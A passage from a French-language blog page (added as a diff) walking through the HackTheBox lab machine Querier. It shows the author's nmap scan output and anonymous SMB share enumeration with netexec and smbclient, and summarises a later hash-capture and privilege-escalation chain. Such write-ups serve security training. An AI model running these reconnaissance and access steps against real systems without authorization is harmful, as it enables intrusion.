@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Querier - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/querier/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Querier">
+  <meta property="og:description" content="Querier est une machine Windows de difficulté moyenne possédant une feuille de calcul Excel dans un partage de fichiers accessible à tous. La feuille de calcul contient des macros qui se connectent à un serveur MSSQL fonctionnant sur la machine. Le serveur SQL peut être utilisé pour demander un fichier permettant de capturer et craquer des hashes NetNTLMv2 afin de récupérer le mot de passe en clair. Après connexion, PowerUp peut être utilisé pour trouver les identifiants Administrateur dans un fichier de stratégie de groupe mis en cache localement.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:modified_time" content="2025-12-11T10:28:41+00:00">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="MSSQL">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Querier">
+  <meta name="twitter:description" content="Querier est une machine Windows de difficulté moyenne possédant une feuille de calcul Excel dans un partage de fichiers accessible à tous. La feuille de calcul contient des macros qui se connectent à un serveur MSSQL fonctionnant sur la machine. Le serveur SQL peut être utilisé pour demander un fichier permettant de capturer et craquer des hashes NetNTLMv2 afin de récupérer le mot de passe en clair. Après connexion, PowerUp peut être utilisé pour trouver les identifiants Administrateur dans un fichier de stratégie de groupe mis en cache localement.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/querier/" /><link rel="prev" href="http://localhost:1313/reset/" /><link rel="next" href="http://localhost:1313/puppy/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Querier",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/querier\/"
+        },"genre": "posts","keywords": "Medium, Windows, Active Directory, MSSQL","wordcount":  2684 ,
+        "url": "http:\/\/localhost:1313\/querier\/","datePublished": "2025-12-11T10:28:41+00:00","dateModified": "2025-12-11T10:28:41+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Querier</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;2684 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#scan-de-ports">Scan de ports</a></li>
+            <li><a href="#enumération-de-smb445">Enumération de SMB(445)</a></li>
+            <li><a href="#analyse-du-fichier-excel">Analyse du fichier EXCEL</a></li>
+            <li><a href="#enumération-de-mssql1433">Enumération de MSSQL(1433)</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-mssql-svc">Shell en tant que mssql-svc</a></li>
+        <li><a href="#shell-en-tant-quadministrateur">Shell en tant qu&rsquo;administrateur</a>
+          <ul>
+            <li><a href="#seimpersonateprivilege">SeImpersonatePrivilege</a></li>
+            <li><a href="#godpotato">GodPotato</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Querier/querier.png"
+        data-srcset="/images/Querier/querier.png, /images/Querier/querier.png 1.5x, /images/Querier/querier.png 2x"
+        data-sizes="auto"
+        alt="/images/Querier/querier.png"
+        title="Querier" width="646" height="307" /></p>
+<p>Querier est une machine Windows de difficulté moyenne possédant une feuille de calcul Excel dans un partage de fichiers accessible à tous. La feuille de calcul contient des macros qui se connectent à un serveur MSSQL fonctionnant sur la machine. Le serveur SQL peut être utilisé pour demander un fichier permettant de capturer et craquer des hashes NetNTLMv2 afin de récupérer le mot de passe en clair. Après connexion, <code>PowerUp</code> peut être utilisé pour trouver les identifiants Administrateur dans un fichier de stratégie de groupe mis en cache localement.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="scan-de-ports">Scan de ports</h3>
+<p>Le scan <code>nmap</code> révèle 14 ports ouverts : <code>SMB</code>, <code>MSSQL</code>, <code>WINRM</code>, ainsi que d&rsquo;autres ports Windows.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  nmap 10.129.181.104 -T4 -A --min-rate<span class="o">=</span><span class="m">1000</span> -vv -p-
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-20 23:05 CEST
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   syn-ack ttl <span class="m">127</span> Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds? syn-ack ttl <span class="m">127</span>
+</span></span><span class="line"><span class="cl">1433/tcp  open  ms-sql-s      syn-ack ttl <span class="m">127</span> Microsoft SQL Server <span class="m">2017</span> 14.00.1000.00<span class="p">;</span> RTM
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-07-20T21:10:42+00:00<span class="p">;</span> 0s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-07-20T21:03:18
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2055-07-20T21:03:18
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   5466d4fc6e8293f0a280ca0d9b4fc2bf
+</span></span><span class="line"><span class="cl"><span class="p">|</span> SHA-1: c8f9d7a9d65be37878ea4bc4106d02f904973952
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -----BEGIN CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MIIDADCCAeigAwIBAgIQfRL97hXcIbNAdzXRdqRG2DANBgkqhkiG9w0BAQsFADA7
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
+</span></span><span class="line"><span class="cl"><span class="p">|</span> bABsAGIAYQBjAGswIBcNMjUwNzIwMjEwMzE4WhgPMjA1NTA3MjAyMTAzMThaMDsx
+</span></span><span class="line"><span class="cl"><span class="p">|</span> OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
+</span></span><span class="line"><span class="cl"><span class="p">|</span> AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM7zNp1i
+</span></span><span class="line"><span class="cl"><span class="p">|</span> BBDdzDwYiu6VDXgFsiv3nkg2zrAeSVKiWZr+rHna/vh1asIIccaHF1JahiimeF9O
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MqwiQqS/DfrdvK6UVpLgFz2t0rcPC/Vqs/dnxvK+G5ihtdCxom2ccDI7Str7fq72
+</span></span><span class="line"><span class="cl"><span class="p">|</span> eeieRT18TsVp/r9LiMkmAnffha7zD55/KX5pntfCZhFOyVMO8OvKP4rvBaf9yamg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 3CVXO+QUrQ5V1m2BBCkIidESoc4uGVQXLYokai3Be+24PJvABJdULm3F8FhFxJNv
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 7fjF9KFWkB6/nUH4A3/Q5eXgvNYKc/wTbg3SDKV8iM/q+43GmWLXBLTYCFzqu9Tz
+</span></span><span class="line"><span class="cl"><span class="p">|</span> cn45qvhKAlyZNIkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEADTGOs8a6x8dOOmL6
+</span></span><span class="line"><span class="cl"><span class="p">|</span> pFZDWpst4Nfbp4NtX4+BEG/RGOnGTnXVjZIBc2JvFsq+1M0h2ATV2zGuEZIHyvdO
+</span></span><span class="line"><span class="cl"><span class="p">|</span> eDuwuBE3SH2kdOQI/oeSWFo1eBAroqbW7AGOAunZ4NkuPc6OhpW8Kq27xjewRDfK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> WHXYyWCnZBtSXylfhSQff1R2XykuEMhyqYSCyiwh9T27Sx/9BBWe7imaqhlV9aed
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ohqwLj9/MpjRxKFj1pqCXxeDQfdeDXyi4pfMd/ox2YQc3wj379Oq0XzT5fhUR9Yk
+</span></span><span class="line"><span class="cl"><span class="p">|</span> seTkehAzg6M4/QL4wJIfXMMNLQCnbwYOwZjaoYM3gesuCslmV+OF1AKY62svb+Bo
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nv">lbvlJQ</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-----END CERTIFICATE-----
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">47001/tcp open  http          syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49671/tcp open  msrpc         syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
+</span></span><span class="line"><span class="cl">OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.93%E<span class="o">=</span>4%D<span class="o">=</span>7/20%OT<span class="o">=</span>135%CT<span class="o">=</span>2%CU<span class="o">=</span>36618%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>687D5B
+</span></span><span class="line"><span class="cl">OS:52%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>106%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10A%TI<span class="o">=</span>I%CI<span class="o">=</span>I%II<span class="o">=</span>I%SS<span class="o">=</span>S%TS
+</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>U<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M552NW8NNS%O2<span class="o">=</span>M552NW8NNS%O3<span class="o">=</span>M552NW8%O4<span class="o">=</span>M552NW8NNS%O5<span class="o">=</span>M552NW8NN
+</span></span><span class="line"><span class="cl">OS:S%O6<span class="o">=</span>M552NNS<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FFFF%W2<span class="o">=</span>FFFF%W3<span class="o">=</span>FFFF%W4<span class="o">=</span>FFFF%W5<span class="o">=</span>FFFF%W6<span class="o">=</span>FF70<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
+</span></span><span class="line"><span class="cl">OS:%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>FFFF%O<span class="o">=</span>M552NW8NNS%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD
+</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%D
+</span></span><span class="line"><span class="cl">OS:F<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O
+</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>80%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK
+</span></span><span class="line"><span class="cl">OS:<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>80%CD<span class="o">=</span>Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Network Distance: <span class="m">2</span> hops
+</span></span><span class="line"><span class="cl">TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">262</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+</span></span><span class="line"><span class="cl">IP ID Sequence Generation: Incremental
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 0s, deviation: 0s, median: 0s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   311:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> p2p-conficker:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 11069/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">&#39;t connect)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   Check 2 (port 4055/tcp): CLEAN (Couldn&#39;</span>t connect<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 34595/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 44373/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2025-07-20T21:10:35
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A</span></span></code></pre></div></div>
+<h3 id="enumération-de-smb445">Enumération de SMB(445)</h3>
+<p>L&rsquo;énumération de partages ne donne rien, mais je récupère le nom de domaine ainsi que le FQDN de la machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb 10.129.181.104 -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.181.104  <span class="m">445</span>    QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.181.104  <span class="m">445</span>    QUERIER          <span class="o">[</span>+<span class="o">]</span> HTB.LOCAL<span class="se">\:</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.181.104  <span class="m">445</span>    QUERIER          <span class="o">[</span>-<span class="o">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb 10.129.181.104 -u <span class="s1">&#39;Guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.181.104  <span class="m">445</span>    QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.181.104  <span class="m">445</span>    QUERIER          <span class="o">[</span>-<span class="o">]</span> Connection Error: The NETBIOS connection with the remote host timed out.</span></span></code></pre></div></div>
+<p>Je les ajoute au fichier <code>/etc/hosts</code> de ma machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;10.129.181.104 htb.local querier.htb.local querier&#34; | tee -a /etc/hosts</span></span></code></pre></div></div>
+<p>La j&rsquo;avoue que je comprend pas pourquoi mais avec <code>netexec</code> n&rsquo;arrivait pas à me lister les différents partages. De même avec <code>RPCClient</code>. En tout cas, j&rsquo;ai pour l&rsquo;habitude de tester plusieurs outils lors de mon énumération. Et donc avec <code>smbclient</code>, je trouve en tant qu&rsquo;anonyme le partage <code>Reports</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  smbclient -L //querier.htb.local -N
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">        C$              Disk      Default share
+</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">        Reports         Disk</span></span></code></pre></div></div>
+<p>J&rsquo;accède au partage en tant qu&rsquo;<code>anonymous</code> avec l&rsquo;option <code>-N</code> pour ne pas avoir à entrer les identifiants. Je télécharge alors le fichier s&rsquo;y trouvant. Je vois qu&rsquo;il s&rsquo;agit d&rsquo;une fichier EXCEL.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  smbclient -N //querier.htb.local/Reports
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
